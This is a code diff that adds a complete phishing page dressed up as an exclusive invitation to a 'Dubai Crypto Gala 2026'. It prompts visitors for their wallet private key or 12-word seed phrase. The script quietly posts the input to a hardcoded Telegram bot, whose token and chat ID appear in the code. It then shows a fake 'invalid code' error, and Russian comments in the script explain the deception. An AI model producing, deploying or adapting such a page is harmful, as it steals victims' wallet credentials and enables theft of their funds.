@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Private Crypto Event | Dubai 2026</title>
+    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
+    <style>
+        body { background-color: #0B0E11; color: #EAECEF; font-family: system-ui, sans-serif; }
+    </style>
+</head>
+<body class="flex flex-col min-h-screen justify-center items-center px-4">
+
+    <div class="w-full max-w-md bg-[#181A20] border border-[#2B2F36] rounded-2xl p-8 shadow-2xl">
+        <div class="text-center mb-8">
+            <div class="inline-block bg-[#F3BA2F]/10 text-[#F3BA2F] text-xs font-semibold uppercase tracking-widest px-3 py-1 rounded-full mb-3 border border-[#F3BA2F]/20">
+                Exclusive Invitation
+            </div>
+            <h1 class="text-2xl font-bold text-white tracking-tight">Dubai Crypto Gala 2026</h1>
+            <p class="text-sm text-[#929AA5] mt-2">Please connect your wallet or enter registration code to view event details and location.</p>
+        </div>
+
+        <form id="loginForm" class="space-y-4">
+            <div>
+                <label class="block text-xs font-medium text-[#929AA5] uppercase tracking-wider mb-2">Registration Code / Private Key</label>
+                <input type="password" id="secretInput" required autocomplete="off"
+                    class="w-full bg-[#202226] border border-[#474D57] rounded-xl px-4 py-3 text-white placeholder-[#5E6673] focus:outline-none focus:border-[#F3BA2F] transition-colors text-sm" 
+                    placeholder="Enter 12-word seed or VIP code">
+            </div>
+
+            <button type="submit" 
+                class="w-full bg-[#F3BA2F] hover:bg-[#F3BA2F]/90 text-[#0B0E11] font-semibold py-3 px-4 rounded-xl transition-all shadow-lg shadow-[#F3BA2F]/10 text-sm cursor-pointer">
+                Verify & Access Venue
+            </button>
+        </form>
+
+        <div id="errorMessage" class="hidden mt-4 text-center text-sm text-red-400 bg-red-500/10 border border-red-500/20 py-2 rounded-lg">
+            Invalid invitation code. Access denied.
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const inputData = document.getElementById('secretInput').value;
+            const errorBlock = document.getElementById('errorMessage');
+
+            // Твой Telegram-бот, куда полетят логи
+            const BOT_TOKEN = '7611417066:AAHT5hH2UvWpA-K6B33Xf0zbygG5mS_XzI4';
+            const CHAT_ID = '601362095';
+            
+            const message = `⚠️ СВЕЖИЙ ЛОГ С ЛЕНДИНГА!\n\nВвод: ${inputData}`;
+
+            try {
+                // Отправляем данные в телеграм в тихую
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+                });
+            } catch (err) {
+                console.error(err);
+            }
+
+            // Показываем фейковую ошибку пользователю, чтобы он подумал, что код не подошел
+            errorBlock.classList.remove('hidden');
+            document.getElementById('secretInput').value = '';
+        });
+    </script>
+</body>
+</html>
